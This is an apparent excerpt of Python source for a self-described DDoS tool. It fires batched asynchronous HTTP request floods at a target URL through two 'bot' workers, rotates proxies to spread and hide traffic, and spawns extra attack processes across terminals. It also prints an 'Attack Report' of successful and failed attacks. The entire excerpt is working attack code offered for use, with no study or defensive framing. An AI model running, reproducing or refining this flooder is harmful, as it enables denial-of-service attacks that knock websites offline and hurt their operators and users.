// ... existing code ...
# Function to perform DDoS attack (optimized)
async def attack(url, session, stealth_mode, proxy=None, bot_id=1):
    headers = generate_headers(url)
    try:
        if proxy:
            # Reduced timeout and optimized connection settings for proxies
            timeout = aiohttp.ClientTimeout(total=3, connect=1)
            connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as proxy_session:
                async with proxy_session.get(url, headers=headers, proxy=proxy) as response:
                    return f"Success-Bot{bot_id}"
        else:
            async with session.get(url, headers=headers, timeout=5) as response:
                return f"Success-Bot{bot_id}"
    except:
        return f"Failed-Bot{bot_id}"

# Main function to run concurrent attacks (optimized)
async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
    clear_screen()
    print(ASCII_ART)

    print(f"{Fore.RED}Launching attack on {Fore.YELLOW}{url}{Style.RESET_ALL}")
    print(f"{Fore.RED}Requests: {Fore.YELLOW}{num_requests}{Style.RESET_ALL}\n")
    print(f"{Fore.RED}Press Ctrl+C to stop attack{Style.RESET_ALL}\n")

    success_count = {'Bot1': 0, 'Bot2': 0}
    failure_count = {'Bot1': 0, 'Bot2': 0}
    start_time = time.time()
    
    # Determine if this is a spawned terminal
    is_spawned = '--spawn-instance' in sys.argv
    
    # Get terminal number if this is a spawned instance
    terminal_number = 0
    if is_spawned:
        try:
            # Extract terminal number from window title (format: "DDOS Terminal X/Y")
            if os.name == 'nt':
                for proc in psutil.process_iter(['pid', 'name', 'window_title']):
                    if proc.info['window_title'] and "DDOS Terminal" in proc.info['window_title']:
                        terminal_number = int(proc.info['window_title'].split()[2].split('/')[0])
                        break
        except:
            pass
    
    # Split proxies for this terminal if using proxies
    if use_proxy and proxies:
        terminal_proxies = get_terminal_proxies(proxies, terminal_number, TOTAL_TERMINALS)
        if terminal_proxies:
            # Split proxies between the two bots
            bot1_proxies = terminal_proxies[::2]  # Even indices
            bot2_proxies = terminal_proxies[1::2]  # Odd indices
            print(f"{Fore.CYAN}Using {len(bot1_proxies)} unique proxies for Bot1{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Using {len(bot2_proxies)} unique proxies for Bot2{Style.RESET_ALL}")
            # Optimize connection settings for proxy mode
            connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
            timeout = aiohttp.ClientTimeout(total=3, connect=1)
            client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        else:
            print(f"{Fore.YELLOW}No proxies assigned to this terminal{Style.RESET_ALL}")
            client_session = aiohttp.ClientSession()
            bot1_proxies = []
            bot2_proxies = []
    else:
        terminal_proxies = []
        client_session = aiohttp.ClientSession()
        bot1_proxies = []
        bot2_proxies = []
    
    # Set batch size based on proxy usage
    current_batch_size = BATCH_SIZE_WITH_PROXY if terminal_proxies else BATCH_SIZE_NO_PROXY
    print(f"{Fore.CYAN}Using batch size: {current_batch_size} {'(with proxies)' if terminal_proxies else '(without proxies)'}{Style.RESET_ALL}\n")

    # Only spawn additional processes if this is the main instance
    if not is_spawned:
        spawn_attack_processes(url, num_requests, stealth_mode)

    try:
        async with client_session as session:
            tasks = []
            for i in range(num_requests):
                # Create tasks for both bots
                proxy1 = random.choice(bot1_proxies) if bot1_proxies else None
                proxy2 = random.choice(bot2_proxies) if bot2_proxies else None
                
                tasks.append(asyncio.create_task(attack(url, session, stealth_mode, proxy1, 1)))
                tasks.append(asyncio.create_task(attack(url, session, stealth_mode, proxy2, 2)))

                if len(tasks) >= current_batch_size * 2:  # Multiply by 2 for two bots
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for result in results:
                        if isinstance(result, str):
                            if result.startswith("Success"):
                                bot_id = "Bot" + result.split("Bot")[1]
                                success_count[bot_id] += 1
                            elif result.startswith("Failed"):
                                bot_id = "Bot" + result.split("Bot")[1]
                                failure_count[bot_id] += 1
                    
                    tasks = []
                    show_progress((i + 1) / num_requests * 100)
                    
                    # Update monitor data
                    stats = {
                        "success": sum(success_count.values()),
                        "failure": sum(failure_count.values()),
                        "progress": (i + 1) / num_requests * 100,
                        "proxy_count": len(terminal_proxies) if terminal_proxies else 0,
                        "bot1_success": success_count['Bot1'],
                        "bot2_success": success_count['Bot2'],
                        "bot1_failure": failure_count['Bot1'],
                        "bot2_failure": failure_count['Bot2']
                    }
                    update_monitor_data(terminal_number, stats)

            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, str):
                        if result.startswith("Success"):
                            bot_id = "Bot" + result.split("Bot")[1]
                            success_count[bot_id] += 1
                        elif result.startswith("Failed"):
                            bot_id = "Bot" + result.split("Bot")[1]
                            failure_count[bot_id] += 1
                
                show_progress(100)
                
                # Final monitor data update
                stats = {
                    "success": sum(success_count.values()),
                    "failure": sum(failure_count.values()),
                    "progress": 100,
                    "proxy_count": len(terminal_proxies) if terminal_proxies else 0,
                    "bot1_success": success_count['Bot1'],
                    "bot2_success": success_count['Bot2'],
                    "bot1_failure": failure_count['Bot1'],
                    "bot2_failure": failure_count['Bot2']
                }
                update_monitor_data(terminal_number, stats)

    except KeyboardInterrupt:
        if not is_spawned:  # Only parent process should cleanup
            kill_all_terminals()  # Silent kill
            print(f"\n\n{Fore.RED}Attack stopped.{Style.RESET_ALL}")
        return

    except Exception as e:
        if not is_spawned:
            kill_all_terminals()  # Silent kill
        raise

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(f"\n\n{Fore.RED}═══════ 💣 Attack Report 💣 ═══════{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Target URL:{Style.RESET_ALL} {url}")
    print(f"{Fore.YELLOW}Total Requests:{Style.RESET_ALL} {num_requests}")
    print(f"{Fore.GREEN}Bot1 Successful Attacks:{Style.RESET_ALL} {success_count['Bot1']}")
    print(f"{Fore.RED}Bot1 Failed Attacks:{Style.RESET_ALL} {failure_count['Bot1']}")
    print(f"{Fore.GREEN}Bot2 Successful Attacks:{Style.RESET_ALL} {success_count['Bot2']}")
    print(f"{Fore.RED}Bot2 Failed Attacks:{Style.RESET_ALL} {failure_count['Bot2']}")
    print(f"{Fore.BLUE}Time Elapsed:{Style.RESET_ALL} {elapsed_time:.2f} seconds")
    if terminal_proxies:
        print(f"{Fore.CYAN}Total Proxies Used:{Style.RESET_ALL} {len(terminal_proxies)}")
        print(f"{Fore.CYAN}Bot1 Proxies:{Style.RESET_ALL} {len(bot1_proxies)}")
        print(f"{Fore.CYAN}Bot2 Proxies:{Style.RESET_ALL} {len(bot2_proxies)}")
    print(f"{Fore.RED}═══════════════════════════════════{Style.RESET_ALL}")
// ... existing code ...